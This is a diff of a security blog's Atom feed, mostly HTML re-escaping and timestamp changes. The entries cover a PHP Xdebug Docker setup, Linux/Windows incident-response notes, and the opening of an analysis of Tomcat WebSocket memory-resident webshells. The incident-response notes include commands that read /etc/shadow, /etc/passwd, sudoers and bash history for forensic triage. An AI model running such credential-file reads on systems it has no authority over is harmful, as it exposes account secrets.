-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;container_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;php-82-apache-xdebug-32&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;s2&#34;&gt;&amp;#34;50080:80&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# - &amp;#34;9001:9001&amp;#34; # for dbgpProxy&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;./html:/var/www/html&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;environment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Xdebug 2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# XDEBUG_CONFIG: &amp;#34;remote_handler=dbgp remote_host=host.docker.internal idekey=PHPSTORM&amp;#34; &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Xdebug 3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;XDEBUG_CONFIG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;remote_handler=dbgp client_host=host.docker.internal&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;XDEBUG_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;PHPSTORM&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nt&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;3.2&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;services&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;  &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;webserver&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;image&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;php-82-apache-xdebug-32&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;container_name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;l&#34;&gt;php-82-apache-xdebug-32&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;ports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;s2&#34;&gt;&amp;#34;50080:80&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# - &amp;#34;9001:9001&amp;#34; # for dbgpProxy&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;volumes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;- &lt;span class=&#34;l&#34;&gt;./html:/var/www/html&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;environment&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Xdebug 2&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# XDEBUG_CONFIG: &amp;#34;remote_handler=dbgp remote_host=host.docker.internal idekey=PHPSTORM&amp;#34; &lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;c&#34;&gt;# Xdebug 3&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;XDEBUG_CONFIG&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;remote_handler=dbgp client_host=host.docker.internal&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;      &lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;XDEBUG_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;PHPSTORM&amp;#34;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;可见&lt;a href=&#34;https://github.com/Anthem-whisper/docker-debug-images&#34;&gt;Github&lt;/a&gt;，嫌麻烦也可以直接从&lt;a href=&#34;https://hub.docker.com/r/wh1sperdiyu/php-82-apache-xdebug-32&#34;&gt;Dockerhub&lt;/a&gt;拉image：&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -177,8 +297,8 @@
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;docker pull wh1sperdiyu/php-82-apache-xdebug-32:latest
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker pull wh1sperdiyu/php-82-apache-xdebug-32:latest
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;配置phpstorm&#34;&gt;配置PhpStorm&lt;/h2&gt;
 &lt;p&gt;在&lt;code&gt;设置-PHP-服务器&lt;/code&gt;中添加一个服务器，信息按照实际情况填写。选择路径映射，服务器上的绝对路径填写根目录，我这个镜像是&lt;code&gt;/var/www/html/&lt;/code&gt;&lt;/p&gt;
@@ -239,7 +359,7 @@
             <title type="text">应急响应笔记</title>
             <link rel="alternate" type="text/html" href="https://blog.wh1sper.com/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/" />
             <id>https://blog.wh1sper.com/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/</id>
-            <updated>2022-10-30T10:47:31&#43;08:00</updated>
+            <updated>2022-10-30T10:47:32&#43;08:00</updated>
             <published>2022-08-15T15:33:08&#43;08:00</published>
             <author>
                     <name>wh1sper</name>
@@ -265,15 +385,15 @@
 &lt;/ul&gt;
 &lt;p&gt;ls -ltha列举所有文件&lt;/p&gt;
 &lt;p&gt;基于时间和权限的筛选&lt;/p&gt;
-&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find ./ -mtime 0 -name &amp;quot;*.php&amp;quot;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find ./ -mtime 0 -name &amp;#34;*.php&amp;#34;
 # 查找24h内修改的php文件
 
-find ./ -iname &amp;quot;*.php&amp;quot; -perm 777
+find ./ -iname &amp;#34;*.php&amp;#34; -perm 777
 # -iname 忽略大小写，-perm查找777权限
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;网络连接与进程&#34;&gt;网络连接与进程&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;netstat -pantl
 netstat -anpt
-netstat -pantl | grep &amp;quot;ESTABLISHED&amp;quot;查看正在建立连接的端口
+netstat -pantl | grep &amp;#34;ESTABLISHED&amp;#34;查看正在建立连接的端口
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看进程对应的文件&lt;/p&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ps aux 
 ps aux | grep ${PID}
@@ -283,10 +403,10 @@ killall php-fpm # 杀死所有php-fpm进程
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;登录与用户&#34;&gt;登录与用户&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;last -i | grep -v 0.0.0.0 # 查看登录日志，筛选非本地登录
 w # 看现在那些用户登陆了
-cat /etc/passwd | grep &amp;quot;0:0&amp;quot;
-awk -F: &#39;$3==0{print $1}&#39; /etc/passwd # 查询特权用户
-awk &#39;/\$1|\$6/{print $1}&#39; /etc/shadow # 查询可以远程登录的账号
-more /etc/sudoers | grep -v &amp;quot;^#\|^$&amp;quot; grep &amp;quot;ALL=(ALL)&amp;quot; # 查询具有sudo权限的账号
+cat /etc/passwd | grep &amp;#34;0:0&amp;#34;
+awk -F: &amp;#39;$3==0{print $1}&amp;#39; /etc/passwd # 查询特权用户
+awk &amp;#39;/\$1|\$6/{print $1}&amp;#39; /etc/shadow # 查询可以远程登录的账号
+more /etc/sudoers | grep -v &amp;#34;^#\|^$&amp;#34; grep &amp;#34;ALL=(ALL)&amp;#34; # 查询具有sudo权限的账号
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;历史命令&#34;&gt;历史命令&lt;/h3&gt;
 &lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;history
 cat ~/.bash_history
@@ -345,7 +465,7 @@ netstat -ano | findstr 13232
 tasklist | findstr 13232
 
 # 通过进程找到文件路径
-wmic process where name=&amp;quot;firefox.exe&amp;quot; get processid,executablepath,name
+wmic process where name=&amp;#34;firefox.exe&amp;#34; get processid,executablepath,name
 wmic process get name,executablepath,processid|findstr 2860
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;敏感目录-1&#34;&gt;敏感目录&lt;/h3&gt;
 &lt;ol&gt;
@@ -376,10 +496,10 @@ lusrmgr.msc #  查看用户和用户组
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;net user # 查询本机用户
-net localgroup Administrators # 查询admin组
-query user # 查询登录用户
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net user # 查询本机用户
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net localgroup Administrators # 查询admin组
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;query user # 查询登录用户
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h3 id=&#34;启动项&#34;&gt;启动项&lt;/h3&gt;
 &lt;p&gt;启动目录&lt;/p&gt;
@@ -452,7 +572,7 @@ eventvwr.msc # 事件查看器（查看系统日志，安全日志）
             <title type="text">Tomcat WebSocket内存马原理浅析</title>
             <link rel="alternate" type="text/html" href="https://blog.wh1sper.com/posts/tomcat-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/" />
             <id>https://blog.wh1sper.com/posts/tomcat-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</id>
-            <updated>2022-10-30T10:47:31&#43;08:00</updated>
+            <updated>2022-10-30T10:47:32&#43;08:00</updated>
             <published>2022-07-19T00:58:30&#43;08:00</published>
             <author>
                     <name>wh1sper</name>
@@ -494,8 +614,8 @@ eventvwr.msc # 事件查看器（查看系统日志，安全日志）
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@ServerEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws/{userId}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encoders&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MessageEncoder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decoders&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MessageDecoder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configurator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MyServerConfigurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@ServerEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws/{userId}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encoders&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MessageEncoder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decoders&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MessageDecoder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configurator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MyServerConfigurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;@ServerEndpoint可以注解到任何类上，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：&lt;/p&gt;
 &lt;ul&gt;
@@ -514,8 +634,8 @@ eventvwr.msc # 事件查看器（查看系统日志，安全日志）
 &lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
-&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;serverEndpointConfig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebSocketServerEndpoint3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws/{userId}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decoders&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decoderList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;encoders&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encoderList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;configurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MyServerConfigurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;serverEndpointConfig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebSocketServerEndpoint3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws/{userId}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decoders&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decoderList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;encoders&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encoderList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;configurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MyServerConfigurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;h2 id=&#34;tomcat-websocket的加载&#34;&gt;Tomcat WebSocket的加载&lt;/h2&gt;
 &lt;p&gt;Tomcat提供了一个&lt;code&gt;javax.servlet.ServletContainerInitializer&lt;/code&gt;的实现类&lt;code&gt;org.apache.tomcat.websocket.server.WsSci&lt;/code&gt;。&lt;/p&gt;
@@ -557,10 +677,10 @@ eventvwr.msc # 事件查看器（查看系统日志，安全日志）
 &lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
 &lt;td class=&#34;lntd&#34;&gt;
